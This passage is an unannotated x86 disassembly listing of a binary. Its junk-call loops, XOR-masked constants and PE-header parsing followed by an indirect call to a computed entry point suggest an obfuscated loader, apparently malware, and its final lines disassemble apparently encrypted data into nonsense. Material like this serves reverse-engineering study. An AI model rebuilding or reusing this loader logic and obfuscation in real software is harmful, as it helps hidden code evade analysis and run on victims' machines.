  409d8f:	mov    edx,DWORD PTR ds:0x41abd6
  409d95:	dec    edx
  409d96:	mov    DWORD PTR ds:0x41abd6,edx
  409d9c:	jmp    0x409d50
  409da1:	and    DWORD PTR [ebp-0x4],edi
  409da4:	and    ecx,ecx
  409da6:	mov    ecx,DWORD PTR [ebp-0x4]
  409da9:	inc    edx
  409daa:	imul   ecx,ecx,0x7f659e30
  409db0:	mov    DWORD PTR [ebp-0x4],ecx
  409db3:	mov    edx,DWORD PTR ds:0x412364
  409db9:	xor    edx,DWORD PTR ds:0x4235bf
  409dbf:	mov    DWORD PTR ds:0x412364,edx
  409dc5:	or     DWORD PTR [ebp-0x4],esi
  409dc8:	mov    DWORD PTR ds:0x415105,0x4568
  409dd2:	mov    ecx,DWORD PTR [ebp-0x4]
  409dd5:	mov    edx,DWORD PTR ds:0x415115
  409ddb:	mov    edx,DWORD PTR [ebp-0xc]
  409dde:	cmp    ecx,DWORD PTR [edx]
  409de0:	jne    0x40a327
  409de6:	inc    eax
  409de7:	mov    DWORD PTR ds:0x4235bf,0x6f03
  409df1:	cmp    eax,0x4
  409df4:	jb     0x409d43
  409dfa:	xor    eax,eax
  409dfc:	sbb    DWORD PTR ds:0x412360,edx
  409e02:	shl    DWORD PTR [ebp-0x4],1
  409e05:	and    DWORD PTR [ebp-0x4],edi
  409e08:	mov    ecx,DWORD PTR [ebp-0x4]
  409e0b:	and    DWORD PTR ds:0x417e4d,0x0
  409e15:	mov    edx,DWORD PTR ds:0x417e4d
  409e1b:	inc    edx
  409e1c:	mov    DWORD PTR ds:0x417e4d,edx
  409e22:	cmp    DWORD PTR ds:0x417e4d,0xa
  409e29:	jne    0x409e4c
  409e2f:	push   DWORD PTR [ebp-0x20]
  409e32:	push   0x8411
  409e37:	push   0x41ad5b
  409e3c:	push   0x41adfd
  409e41:	push   0x1dc1
  409e46:	call   DWORD PTR ds:0x40d010
  409e4c:	cmp    DWORD PTR ds:0x417e4d,0x9
  409e53:	jne    0x409e68
  409e59:	xor    edx,edx
  409e5b:	or     edx,DWORD PTR ds:0x417e4d
  409e61:	inc    edx
  409e62:	mov    DWORD PTR ds:0x417e4d,edx
  409e68:	cmp    DWORD PTR ds:0x417e4d,0x19
  409e6f:	jb     0x409e15
  409e75:	mov    edx,DWORD PTR ds:0x417eaa
  409e7b:	mov    edx,DWORD PTR [edx]
  409e7d:	xor    DWORD PTR ds:0x41abda,edx
  409e83:	imul   ecx,ecx,0x7f659e30
  409e89:	mov    edx,DWORD PTR ds:0x412374
  409e8f:	sub    DWORD PTR ds:0x415111,edx
  409e95:	mov    DWORD PTR [ebp-0x4],ecx
  409e98:	and    edx,edx
  409e9a:	or     DWORD PTR [ebp-0x4],esi
  409e9d:	mov    ecx,DWORD PTR [ebp-0x4]
  409ea0:	mov    edx,DWORD PTR [ebp-0xc]
  409ea3:	mov    DWORD PTR ds:0x4235cb,0xa9e
  409ead:	cmp    ecx,DWORD PTR [edx]
  409eaf:	jne    0x40a327
  409eb5:	mov    DWORD PTR ds:0x4150fd,0x72ef
  409ebf:	inc    eax
  409ec0:	cmp    eax,0x4
  409ec3:	mov    DWORD PTR ds:0x412370,0x6303
  409ecd:	jb     0x409dfc
  409ed3:	xor    eax,eax
  409ed5:	and    DWORD PTR ds:0x4150fd,0x0
  409edf:	xor    ecx,ecx
  409ee1:	add    ecx,DWORD PTR ds:0x4150fd
  409ee7:	inc    ecx
  409ee8:	mov    DWORD PTR ds:0x4150fd,ecx
  409eee:	cmp    DWORD PTR ds:0x4150fd,0x28
  409ef5:	jne    0x409f04
  409efb:	push   DWORD PTR [ebp-0x24]
  409efe:	call   DWORD PTR ds:0x40d014
  409f04:	cmp    DWORD PTR ds:0x4150fd,0x18
  409f0b:	jb     0x409edf
  409f11:	add    DWORD PTR ds:0x417e59,0x412378
  409f1b:	shl    DWORD PTR [ebp-0x4],1
  409f1e:	and    DWORD PTR [ebp-0x4],edi
  409f21:	and    DWORD PTR ds:0x412360,0x0
  409f2b:	jmp    0x409f3f
  409f30:	xor    edx,edx
  409f32:	or     edx,DWORD PTR ds:0x412360
  409f38:	inc    edx
  409f39:	mov    DWORD PTR ds:0x412360,edx
  409f3f:	cmp    DWORD PTR ds:0x412360,0x11
  409f46:	jae    0x409f85
  409f4c:	cmp    DWORD PTR ds:0x412360,0x1a
  409f53:	jne    0x409f80
  409f59:	push   0x415119
  409f5e:	push   0x8b4a
  409f63:	push   DWORD PTR [ebp-0x24]
  409f66:	push   0x89fe
  409f6b:	push   0x7f12
  409f70:	push   0x7c49
  409f75:	push   0x1205
  409f7a:	call   DWORD PTR ds:0x40d200
  409f80:	jmp    0x409f30
  409f85:	mov    ecx,DWORD PTR [ebp-0x4]
  409f88:	imul   ecx,ecx,0x7f659e30
  409f8e:	mov    DWORD PTR [ebp-0x4],ecx
  409f91:	or     DWORD PTR [ebp-0x4],esi
  409f94:	mov    ecx,DWORD PTR [ebp-0x4]
  409f97:	mov    edx,DWORD PTR [ebp-0xc]
  409f9a:	mov    DWORD PTR ds:0x4235c7,0x2f25
  409fa4:	cmp    ecx,DWORD PTR [edx]
  409fa6:	mov    DWORD PTR ds:0x412358,0x1252
  409fb0:	jne    0x40a327
  409fb6:	inc    eax
  409fb7:	cmp    eax,0x4
  409fba:	mov    DWORD PTR ds:0x4235db,0x48e
  409fc4:	jb     0x409ed5
  409fca:	mov    DWORD PTR ds:0x417e55,0x10
  409fd4:	cmp    DWORD PTR ds:0x417e55,0x0
  409fdb:	je     0x40a032
  409fe1:	cmp    DWORD PTR ds:0x417e55,0x19
  409fe8:	jne    0x40a00e
  409fee:	push   DWORD PTR [ebp-0x24]
  409ff1:	push   0x4235db
  409ff6:	push   DWORD PTR [ebp-0x28]
  409ff9:	push   0x41ada3
  409ffe:	push   0x6e83
  40a003:	push   0x54b6
  40a008:	call   DWORD PTR ds:0x40d204
  40a00e:	mov    edx,DWORD PTR ds:0x417e55
  40a014:	dec    edx
  40a015:	mov    DWORD PTR ds:0x417e55,edx
  40a01b:	jmp    0x409fd4
  40a020:	mov    ecx,DWORD PTR ds:0x40eecc
  40a026:	mov    edx,DWORD PTR ds:0x417eba
  40a02c:	sub    ecx,edx
  40a02e:	imul   ecx,DWORD PTR [ecx+edx*1]
  40a032:	xor    eax,eax
  40a034:	shl    DWORD PTR [ebp-0x4],1
  40a037:	and    DWORD PTR [ebp-0x4],edi
  40a03a:	or     ecx,ecx
  40a03c:	mov    ecx,DWORD PTR [ebp-0x4]
  40a03f:	xor    edx,DWORD PTR ds:0x417e51
  40a045:	imul   ecx,ecx,0x7f659e30
  40a04b:	mov    DWORD PTR ds:0x417e49,0x1d
  40a055:	cmp    DWORD PTR ds:0x417e49,0x0
  40a05c:	je     0x40a0b0
  40a062:	cmp    DWORD PTR ds:0x417e49,0x7
  40a069:	jne    0x40a07a
  40a06f:	push   0x45c2
  40a074:	call   DWORD PTR ds:0x40d208
  40a07a:	cmp    DWORD PTR ds:0x417e49,0x8
  40a081:	jne    0x40a094
  40a087:	mov    edx,DWORD PTR ds:0x417e49
  40a08d:	dec    edx
  40a08e:	mov    DWORD PTR ds:0x417e49,edx
  40a094:	mov    edx,DWORD PTR ds:0x417e49
  40a09a:	dec    edx
  40a09b:	mov    DWORD PTR ds:0x417e49,edx
  40a0a1:	jmp    0x40a055
  40a0a6:	adc    DWORD PTR ds:0x417e45,0x449b
  40a0b0:	mov    DWORD PTR [ebp-0x4],ecx
  40a0b3:	or     ecx,edx
  40a0b5:	or     DWORD PTR [ebp-0x4],esi
  40a0b8:	mov    edx,0x1393
  40a0bd:	mov    ecx,DWORD PTR [ebp-0x4]
  40a0c0:	mov    edx,DWORD PTR [ebp-0xc]
  40a0c3:	mov    DWORD PTR ds:0x41abda,0x516c
  40a0cd:	cmp    ecx,DWORD PTR [edx]
  40a0cf:	jne    0x40a327
  40a0d5:	mov    DWORD PTR ds:0x415111,0x4e99
  40a0df:	inc    eax
  40a0e0:	mov    DWORD PTR ds:0x4235d3,0x1c73
  40a0ea:	cmp    eax,0x4
  40a0ed:	jb     0x40a034
  40a0f3:	xor    eax,eax
  40a0f5:	or     DWORD PTR ds:0x41236c,0x38d4
  40a0ff:	shl    DWORD PTR [ebp-0x4],1
  40a102:	and    DWORD PTR [ebp-0x4],edi
  40a105:	and    ecx,DWORD PTR ds:0x417e59
  40a10b:	mov    ecx,DWORD PTR [ebp-0x4]
  40a10e:	adc    DWORD PTR ds:0x4235cf,0x729e
  40a118:	imul   ecx,ecx,0x7f659e30
  40a11e:	adc    edx,0x9b0
  40a124:	mov    DWORD PTR [ebp-0x4],ecx
  40a127:	xor    edx,edx
  40a129:	or     edx,DWORD PTR ds:0x417e55
  40a12f:	xor    DWORD PTR ds:0x4235d7,edx
  40a135:	or     DWORD PTR [ebp-0x4],esi
  40a138:	mov    ecx,DWORD PTR [ebp-0x4]
  40a13b:	mov    edx,DWORD PTR [ebp-0xc]
  40a13e:	mov    DWORD PTR ds:0x4235c7,0xce5
  40a148:	cmp    ecx,DWORD PTR [edx]
  40a14a:	jne    0x40a327
  40a150:	mov    DWORD PTR ds:0x41abd6,0x18a3
  40a15a:	inc    eax
  40a15b:	mov    DWORD PTR ds:0x4235bf,0x5769
  40a165:	cmp    eax,0x4
  40a168:	mov    DWORD PTR ds:0x412358,0x5fb5
  40a172:	jb     0x40a0f5
  40a178:	sbb    ecx,DWORD PTR ds:0x417e59
  40a17e:	xor    eax,eax
  40a180:	mov    DWORD PTR ds:0x412360,0x14
  40a18a:	cmp    DWORD PTR ds:0x412360,0x0
  40a191:	je     0x40a1c1
  40a197:	cmp    DWORD PTR ds:0x412360,0x19
  40a19e:	jne    0x40a1af
  40a1a4:	push   0x2f20
  40a1a9:	call   DWORD PTR ds:0x40d018
  40a1af:	mov    edx,DWORD PTR ds:0x412360
  40a1b5:	dec    edx
  40a1b6:	mov    DWORD PTR ds:0x412360,edx
  40a1bc:	jmp    0x40a18a
  40a1c1:	shl    DWORD PTR [ebp-0x4],1
  40a1c4:	mov    DWORD PTR ds:0x41abe2,0x14
  40a1ce:	cmp    DWORD PTR ds:0x41abe2,0x0
  40a1d5:	je     0x40a233
  40a1db:	cmp    DWORD PTR ds:0x41abe2,0x5
  40a1e2:	jne    0x40a203
  40a1e8:	push   0x1b4e
  40a1ed:	push   DWORD PTR [ebp-0x1c]
  40a1f0:	push   0x1704
  40a1f5:	push   0x41abf4
  40a1fa:	push   DWORD PTR [ebp-0x10]
  40a1fd:	call   DWORD PTR ds:0x40d01c
  40a203:	cmp    DWORD PTR ds:0x41abe2,0x6
  40a20a:	jne    0x40a21d
  40a210:	mov    edx,DWORD PTR ds:0x41abe2
  40a216:	dec    edx
  40a217:	mov    DWORD PTR ds:0x41abe2,edx
  40a21d:	xor    edx,edx
  40a21f:	add    edx,DWORD PTR ds:0x41abe2
  40a225:	dec    edx
  40a226:	mov    DWORD PTR ds:0x41abe2,edx
  40a22c:	jmp    0x40a1ce
  40a231:	neg    edx
  40a233:	and    DWORD PTR [ebp-0x4],edi
  40a236:	mov    ecx,DWORD PTR [ebp-0x4]
  40a239:	neg    edx
  40a23b:	imul   ecx,ecx,0x7f659e30
  40a241:	xor    edx,DWORD PTR ds:0x41abd2
  40a247:	mov    DWORD PTR [ebp-0x4],ecx
  40a24a:	adc    DWORD PTR ds:0x4235c7,ebx
  40a250:	or     DWORD PTR [ebp-0x4],esi
  40a253:	mov    edx,0x77ca
  40a258:	mov    ecx,DWORD PTR [ebp-0x4]
  40a25b:	mov    edx,DWORD PTR [ebp-0xc]
  40a25e:	mov    DWORD PTR ds:0x41510d,0x1bcb
  40a268:	cmp    ecx,DWORD PTR [edx]
  40a26a:	mov    DWORD PTR ds:0x412354,0x3513
  40a274:	jne    0x40a327
  40a27a:	inc    eax
  40a27b:	cmp    eax,0x4
  40a27e:	mov    DWORD PTR ds:0x417e49,0x110e
  40a288:	jb     0x40a180
  40a28e:	xor    eax,eax
  40a290:	shl    DWORD PTR [ebp-0x4],1
  40a293:	and    DWORD PTR [ebp-0x4],edi
  40a296:	mov    ecx,DWORD PTR [ebp-0x4]
  40a299:	imul   ecx,ecx,0x7f659e30
  40a29f:	mov    DWORD PTR [ebp-0x4],ecx
  40a2a2:	or     DWORD PTR [ebp-0x4],esi
  40a2a5:	mov    ecx,DWORD PTR [ebp-0x4]
  40a2a8:	mov    edx,DWORD PTR [ebp-0xc]
  40a2ab:	cmp    ecx,DWORD PTR [edx]
  40a2ad:	jne    0x40a327
  40a2b3:	inc    eax
  40a2b4:	cmp    eax,0x4
  40a2b7:	jb     0x40a290
  40a2bd:	inc    ebx
  40a2be:	cmp    ebx,0x10
  40a2c1:	jb     0x409b50
  40a2c7:	mov    ebx,0xf89c8538
  40a2cc:	mov    DWORD PTR [ebp-0xc],ebx
  40a2cf:	mov    DWORD PTR [ebp-0x8],0xf89c853b
  40a2d6:	lea    eax,[ebp-0x1c]
  40a2d9:	mov    DWORD PTR [ebp-0x18],eax
  40a2dc:	lea    eax,[ebp-0x20]
  40a2df:	mov    DWORD PTR [ebp-0x10],eax
  40a2e2:	mov    eax,ds:0x40d5d0
  40a2e7:	mov    eax,DWORD PTR [eax+0x1c8]
  40a2ed:	mov    eax,DWORD PTR [eax]
  40a2ef:	mov    ecx,DWORD PTR [ebp-0x10]
  40a2f2:	mov    esi,0x7510859
  40a2f7:	xor    eax,esi
  40a2f9:	mov    edi,0x32729f
  40a2fe:	add    eax,edi
  40a300:	mov    DWORD PTR [ecx],eax
  40a302:	mov    eax,ds:0x40d854
  40a307:	cmp    eax,0x23d14057
  40a30c:	mov    eax,DWORD PTR [ebp-0x8]
  40a30f:	je     0x40a32e
  40a315:	mov    ecx,DWORD PTR [ebp-0xc]
  40a318:	xor    eax,esi
  40a31a:	add    eax,edi
  40a31c:	imul   eax,ecx
  40a31f:	mov    DWORD PTR [ebp-0xc],eax
  40a322:	jmp    0x40a371
  40a327:	xor    eax,eax
  40a329:	jmp    0x40a5d0
  40a32e:	xor    eax,esi
  40a330:	add    eax,edi
  40a332:	mov    ds:0x40d6e0,eax
  40a337:	mov    eax,DWORD PTR [ebp-0xc]
  40a33a:	xor    eax,esi
  40a33c:	add    eax,edi
  40a33e:	mov    ds:0x40d854,eax
  40a343:	mov    eax,DWORD PTR [ebp-0x8]
  40a346:	mov    ecx,DWORD PTR ds:0x40d6e0
  40a34c:	xor    eax,esi
  40a34e:	add    eax,edi
  40a350:	cmp    ecx,eax
  40a352:	jne    0x40a371
  40a358:	push   0x40d72c
  40a35d:	call   DWORD PTR ds:0x40d1ec
  40a363:	mov    ecx,DWORD PTR ds:0x40d5d0
  40a369:	mov    ecx,DWORD PTR [ecx+0x198]
  40a36f:	mov    DWORD PTR [ecx],eax
  40a371:	mov    eax,ds:0x40d5d0
  40a376:	mov    eax,DWORD PTR [eax+0x18c]
  40a37c:	mov    eax,DWORD PTR [eax]
  40a37e:	mov    DWORD PTR [ebp-0x24],eax
  40a381:	mov    eax,0xf89c853c
  40a386:	mov    DWORD PTR [ebp-0x28],eax
  40a389:	mov    DWORD PTR [ebp-0x28],eax
  40a38c:	mov    DWORD PTR [ebp-0x28],eax
  40a38f:	mov    DWORD PTR [ebp-0x10],ebx
  40a392:	mov    DWORD PTR [ebp-0x28],eax
  40a395:	mov    DWORD PTR [ebp-0x28],0xf89c8530
  40a39c:	mov    ebx,DWORD PTR [ebp-0xc]
  40a39f:	mov    ecx,DWORD PTR [ebp-0x8]
  40a3a2:	mov    edx,DWORD PTR [ebp-0x8]
  40a3a5:	xor    edx,esi
  40a3a7:	xor    ecx,esi
  40a3a9:	add    ecx,edx
  40a3ab:	mov    edx,DWORD PTR [ebp-0x8]
  40a3ae:	xor    ebx,esi
  40a3b0:	xor    edx,esi
  40a3b2:	add    ebx,edi
  40a3b4:	lea    ecx,[ecx+edx*1+0x9757dd]
  40a3bb:	cmp    ebx,ecx
  40a3bd:	ja     0x40a41e
  40a3c3:	mov    eax,DWORD PTR [ebp-0x8]
  40a3c6:	xor    eax,esi
  40a3c8:	lea    eax,[eax+ebx*1+0x32729f]
  40a3cf:	push   eax
  40a3d0:	mov    eax,DWORD PTR [ebp-0x10]
  40a3d3:	xor    eax,esi
  40a3d5:	lea    eax,[ebp+eax*1+0x3272a7]
  40a3dc:	push   eax
  40a3dd:	mov    eax,ds:0x40d5d0
  40a3e2:	push   DWORD PTR [eax+0x1bc]
  40a3e8:	call   0x40742d
  40a3ed:	mov    eax,DWORD PTR [ebp-0x8]
  40a3f0:	xor    eax,esi
  40a3f2:	lea    ebx,[ebx+eax*1+0x32729f]
  40a3f9:	mov    eax,DWORD PTR [ebp-0x8]
  40a3fc:	mov    ecx,DWORD PTR [ebp-0x8]
  40a3ff:	xor    ecx,esi
  40a401:	xor    eax,esi
  40a403:	add    eax,ecx
  40a405:	mov    ecx,DWORD PTR [ebp-0x8]
  40a408:	xor    ecx,esi
  40a40a:	lea    eax,[eax+ecx*1+0x9757dd]
  40a411:	cmp    ebx,eax
  40a413:	jbe    0x40a3c3
  40a419:	mov    eax,0xf89c853c
  40a41e:	mov    ecx,DWORD PTR [ebp+0xc]
  40a421:	mov    DWORD PTR ds:0x40d454,ecx
  40a427:	mov    ecx,DWORD PTR [ebp+0x10]
  40a42a:	mov    DWORD PTR ds:0x40d6a8,ecx
  40a430:	mov    ecx,DWORD PTR ds:0x40d454
  40a436:	mov    edx,DWORD PTR [ebp-0x18]
  40a439:	sub    ecx,edi
  40a43b:	xor    ecx,esi
  40a43d:	mov    DWORD PTR [edx],ecx
  40a43f:	mov    ecx,DWORD PTR [ebp-0x1c]
  40a442:	cmp    ecx,0xf89c853b
  40a448:	je     0x40a4a5
  40a44e:	mov    ecx,DWORD PTR [ebp-0xc]
  40a451:	mov    edx,DWORD PTR [ebp-0x20]
  40a454:	xor    ecx,esi
  40a456:	add    ecx,edi
  40a458:	cmp    ecx,edx
  40a45a:	je     0x40a4a5
  40a460:	mov    eax,ds:0x40d5d0
  40a465:	mov    eax,DWORD PTR [eax+0x194]
  40a46b:	mov    ecx,DWORD PTR [eax]
  40a46d:	mov    eax,DWORD PTR [ecx+0x3c]
  40a470:	push   DWORD PTR ds:0x40d6a8
  40a476:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  40a47a:	push   DWORD PTR ds:0x40d454
  40a480:	add    eax,ecx
  40a482:	mov    ecx,DWORD PTR ds:0x40d5d0
  40a488:	mov    ecx,DWORD PTR [ecx+0x194]
  40a48e:	push   DWORD PTR [ecx]
  40a490:	call   eax
  40a492:	mov    ecx,DWORD PTR ds:0x40d5d0
  40a498:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40a49e:	mov    DWORD PTR [ecx],eax
  40a4a0:	jmp    0x40a5b5
  40a4a5:	mov    ecx,DWORD PTR [ebp-0xc]
  40a4a8:	mov    edx,DWORD PTR [ebp-0x24]
  40a4ab:	xor    ecx,esi
  40a4ad:	add    ecx,edi
  40a4af:	cmp    ecx,edx
  40a4b1:	jne    0x40a598
  40a4b7:	mov    ecx,DWORD PTR [ebp-0xc]
  40a4ba:	xor    ecx,esi
  40a4bc:	add    ecx,edi
  40a4be:	mov    DWORD PTR ds:0x40d654,ecx
  40a4c4:	mov    ecx,DWORD PTR [ebp-0xc]
  40a4c7:	xor    ecx,esi
  40a4c9:	add    ecx,edi
  40a4cb:	mov    DWORD PTR ds:0x40d64c,ecx
  40a4d1:	mov    ecx,DWORD PTR [ebp-0x8]
  40a4d4:	mov    DWORD PTR [ebp-0x10],ecx
  40a4d7:	mov    ecx,DWORD PTR [ebp-0xc]
  40a4da:	mov    DWORD PTR [ebp+0xc],ecx
  40a4dd:	mov    ecx,DWORD PTR [ebp+0xc]
  40a4e0:	xor    ecx,esi
  40a4e2:	add    ecx,edi
  40a4e4:	mov    DWORD PTR [ebp+0xc],ecx
  40a4e7:	mov    ecx,DWORD PTR ds:0x40d450
  40a4ed:	mov    ecx,DWORD PTR [ecx]
  40a4ef:	mov    DWORD PTR [ebp+0xc],ecx
  40a4f2:	mov    ecx,DWORD PTR ds:0x40d658
  40a4f8:	mov    ecx,DWORD PTR [ecx]
  40a4fa:	mov    DWORD PTR [ebp-0x18],ecx
  40a4fd:	mov    DWORD PTR [ebp+0x10],0xf89c8738
  40a504:	mov    ecx,DWORD PTR [ebp+0x10]
  40a507:	xor    ecx,esi
  40a509:	add    ecx,edi
  40a50b:	mov    DWORD PTR [ebp+0x10],ecx
  40a50e:	mov    ecx,DWORD PTR ds:0x40d5d0
  40a514:	mov    DWORD PTR [ebp+0x10],ecx
  40a517:	mov    ecx,DWORD PTR [ebp+0xc]
  40a51a:	mov    DWORD PTR [ebp+0xc],ecx
  40a51d:	mov    ecx,DWORD PTR [ebp+0xc]
  40a520:	push   0x4
  40a522:	pop    edx
  40a523:	sub    edx,ecx
  40a525:	add    edx,DWORD PTR [ebp-0x18]
  40a528:	mov    DWORD PTR [ebp-0x28],0xf89c85f8
  40a52f:	mov    DWORD PTR [ebp+0x10],edx
  40a532:	mov    DWORD PTR [ebp-0x74],eax
  40a535:	mov    eax,DWORD PTR [ebp+0xc]
  40a538:	mov    DWORD PTR [ebp-0x70],eax
  40a53b:	mov    eax,DWORD PTR [ebp+0x10]
  40a53e:	mov    DWORD PTR [ebp-0x6c],eax
  40a541:	mov    eax,DWORD PTR [ebp-0x28]
  40a544:	xor    eax,esi
  40a546:	add    eax,edi
  40a548:	mov    DWORD PTR [ebp-0x68],eax
  40a54b:	lea    eax,[ebp-0x30]
  40a54e:	mov    DWORD PTR [ebp-0x64],eax
  40a551:	mov    eax,DWORD PTR [ebp-0x74]
  40a554:	xor    eax,esi
  40a556:	add    eax,edi
  40a558:	mov    DWORD PTR [ebp-0x74],eax
  40a55b:	lea    eax,[ebp-0x74]
  40a55e:	push   eax
  40a55f:	mov    eax,DWORD PTR [ebp-0x10]
  40a562:	xor    eax,esi
  40a564:	add    eax,edi
  40a566:	push   eax
  40a567:	mov    eax,ds:0x40d5f0
  40a56c:	push   0x40d546
  40a571:	push   DWORD PTR [eax]
  40a573:	call   0x40ae4d
  40a578:	xor    esi,esi
  40a57a:	mov    eax,DWORD PTR [ebp+0x10]
  40a57d:	sub    eax,esi
  40a57f:	push   eax
  40a580:	mov    eax,DWORD PTR [ebp+0xc]
  40a583:	add    eax,esi
  40a585:	push   eax
  40a586:	call   0x4059cb
  40a58b:	inc    esi
  40a58c:	cmp    esi,0x52
  40a58f:	jb     0x40a57a
  40a595:	mov    eax,DWORD PTR [ebp-0x10]
  40a598:	call   0x404704
  40a59d:	lea    eax,[ebp+0x4]
  40a5a0:	mov    DWORD PTR [ebp-0x2c],eax
  40a5a3:	mov    eax,DWORD PTR [ebp-0x14]
  40a5a6:	mov    eax,DWORD PTR [ebp-0x8]
  40a5a9:	push   DWORD PTR [ebp-0xc]
  40a5ac:	lea    eax,[ebp-0x2c]
  40a5af:	push   eax
  40a5b0:	call   0x407c0a
  40a5b5:	mov    eax,ds:0x40d5d0
  40a5ba:	push   0x4
  40a5bc:	add    eax,0x1cc
  40a5c1:	push   eax
  40a5c2:	lea    eax,[ebp-0x14]
  40a5c5:	push   eax
  40a5c6:	call   0x40742d
  40a5cb:	mov    eax,DWORD PTR [ebp-0x14]
  40a5ce:	mov    eax,DWORD PTR [eax]
  40a5d0:	pop    edi
  40a5d1:	pop    esi
  40a5d2:	pop    ebx
  40a5d3:	leave  
  40a5d4:	ret    0xc
  40a5d7:	push   ebp
  40a5d8:	mov    ebp,esp
  40a5da:	sub    esp,0x14
  40a5dd:	leave  
  40a5de:	ret    0x4
  40a5e1:	push   ebp
  40a5e2:	mov    ebp,esp
  40a5e4:	push   ecx
  40a5e5:	or     eax,0x5cec
  40a5ea:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  40a5f1:	add    eax,0x77b5
  40a5f6:	mov    eax,DWORD PTR [ebp+0x8]
  40a5f9:	mov    al,BYTE PTR [eax]
  40a5fb:	add    DWORD PTR ds:0x412354,0x2449
  40a605:	add    al,0x34
  40a607:	sbb    DWORD PTR ds:0x41237c,0x412364
  40a611:	xor    al,0x4a
  40a613:	cmp    al,0xcb
  40a615:	mov    DWORD PTR ds:0x4235d3,0x6064
  40a61f:	jne    0x40a6b9
  40a625:	mov    eax,DWORD PTR [ebp+0x8]
  40a628:	mov    ecx,DWORD PTR [ebp+0x8]
  40a62b:	add    ecx,DWORD PTR [eax+0x3c]
  40a62e:	mov    edx,0x7510859
  40a633:	and    DWORD PTR ds:0x412368,0x0
  40a63d:	mov    eax,ds:0x412368
  40a642:	inc    eax
  40a643:	mov    ds:0x412368,eax
  40a648:	cmp    DWORD PTR ds:0x412368,0xe
  40a64f:	jne    0x40a663
  40a655:	push   0x41236c
  40a65a:	push   DWORD PTR [ebp-0x10]
  40a65d:	call   DWORD PTR ds:0x40d398
  40a663:	cmp    DWORD PTR ds:0x412368,0xd
  40a66a:	jne    0x40a67b
  40a670:	mov    eax,ds:0x412368
  40a675:	inc    eax
  40a676:	mov    ds:0x412368,eax
  40a67b:	cmp    DWORD PTR ds:0x412368,0x1f
  40a682:	jb     0x40a63d
  40a688:	mov    DWORD PTR [ebp+0x8],ecx
  40a68b:	mov    eax,DWORD PTR [ebp-0x4]
  40a68e:	xor    eax,edx
  40a690:	push   esi
  40a691:	mov    esi,DWORD PTR [ebp+0x8]
  40a694:	mov    ecx,0x32729f
  40a699:	add    eax,ecx
  40a69b:	cmp    DWORD PTR [esi+0x54],eax
  40a69e:	pop    esi
  40a69f:	je     0x40a6ad
  40a6a5:	mov    eax,DWORD PTR [ebp+0x8]
  40a6a8:	jmp    0x40a6c6
  40a6ad:	mov    eax,DWORD PTR [ebp-0x4]
  40a6b0:	xor    eax,edx
  40a6b2:	add    eax,ecx
  40a6b4:	jmp    0x40a6c6
  40a6b9:	mov    eax,DWORD PTR [ebp-0x4]
  40a6bc:	xor    eax,0x7510859
  40a6c1:	add    eax,0x32729f
  40a6c6:	leave  
  40a6c7:	ret    0x4
  40a6ca:	push   ebp
  40a6cb:	mov    ebp,esp
  40a6cd:	push   ecx
  40a6ce:	mov    DWORD PTR ds:0x417e41,0x1a
  40a6d8:	cmp    DWORD PTR ds:0x417e41,0x0
  40a6df:	je     0x40a739
  40a6e5:	cmp    DWORD PTR ds:0x417e41,0x4
  40a6ec:	jne    0x40a70f
  40a6f2:	push   0x6416
  40a6f7:	push   0x57a6
  40a6fc:	push   0x7327
  40a701:	push   DWORD PTR [ebp-0xc]
  40a704:	push   0x1809
  40a709:	call   DWORD PTR ds:0x40d39c
  40a70f:	cmp    DWORD PTR ds:0x417e41,0x5
  40a716:	jne    0x40a727
  40a71c:	mov    eax,ds:0x417e41
  40a721:	dec    eax
  40a722:	mov    ds:0x417e41,eax
  40a727:	mov    eax,ds:0x417e41
  40a72c:	dec    eax
  40a72d:	mov    ds:0x417e41,eax
  40a732:	jmp    0x40a6d8
  40a737:	sub    edx,edx
  40a739:	push   ecx
  40a73a:	sub    edx,eax
  40a73c:	mov    DWORD PTR [ebp-0x8],0xf89c8538
  40a743:	and    DWORD PTR ds:0x412358,0x0
  40a74d:	jmp    0x40a761
  40a752:	xor    edx,edx
  40a754:	add    edx,DWORD PTR ds:0x412358
  40a75a:	inc    edx
  40a75b:	mov    DWORD PTR ds:0x412358,edx
  40a761:	cmp    DWORD PTR ds:0x412358,0x11
  40a768:	jae    0x40a79c
  40a76e:	cmp    DWORD PTR ds:0x412358,0x18
  40a775:	jne    0x40a791
  40a77b:	push   0x4012
  40a780:	push   DWORD PTR [ebp-0xc]
  40a783:	push   0x7b7f
  40a788:	push   DWORD PTR [ebp-0xc]
  40a78b:	call   DWORD PTR ds:0x40d020
  40a791:	jmp    0x40a752
  40a796:	sub    DWORD PTR ds:0x4235bf,ebx
  40a79c:	mov    DWORD PTR [ebp-0x4],0xf89c853b
  40a7a3:	jmp    0x40a91b
  40a7a8:	(bad)  
  40a7a9:	jmp    0x40a73d
  40a7ab:	aam    0x78
  40a7ad:	push   ebp
  40a7ae:	pop    ecx
  40a7af:	jnp    0x40a756
  40a7b1:	fwait
  40a7b2:	jne    0x40a830
  40a7b4:	mov    ebx,0x5dcbcb8
  40a7b9:	and    eax,0x7fc57e7e
  40a7be:	jle    0x40a83e
  40a7c0:	in     al,0xe8
  40a7c2:	fistp  DWORD PTR [ebp-0x5dfa6a1]
  40a7c8:	in     al,dx
  40a7c9:	aaa    
  40a7ca:	jae    0x40a83f
  40a7cc:	fiadd  DWORD PTR [esi-0x783dc6a3]
  40a7d2:	adc    DWORD PTR [edi],esp
  40a7d4:	jmp    0xc47b4164
  40a7d9:	out    0x4b,al
  40a7db:	mov    esi,0x6ab5ca00
  40a7e0:	push   ds
  40a7e1:	ror    BYTE PTR [ebx-0xffec974],1
  40a7e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a7e8:	jg     0x40a77e
  40a7ea:	mov    bh,BYTE PTR [ecx-0x62092b5d]
  40a7f0:	frstor [edx-0x50]
  40a7f3:	(bad)  
  40a7f4:	adc    BYTE PTR [esi],ah
  40a7f6:	retf   0x1d87
  40a7f9:	dec    eax
  40a7fa:	pop    ecx
  40a7fb:	(bad)  
  40a7fd:	dec    esi
  40a7fe:	mov    gs,eax
  40a800:	sub    DWORD PTR [ebx],0xcf7259eb
  40a806:	in     al,0x51
  40a808:	xor    dh,BYTE PTR [ebx]
  40a80a:	dec    esp
  40a80b:	retf   0x9e46
  40a80e:	cli    
  40a80f:	sbb    dl,ah
  40a811:	cli    
  40a812:	imul   esp,DWORD PTR [ebp+0x5007e6b5],0x84b4ef55
  40a81c:	jp     0x40a7c0
  40a81e:	sbb    eax,0x9bb7054
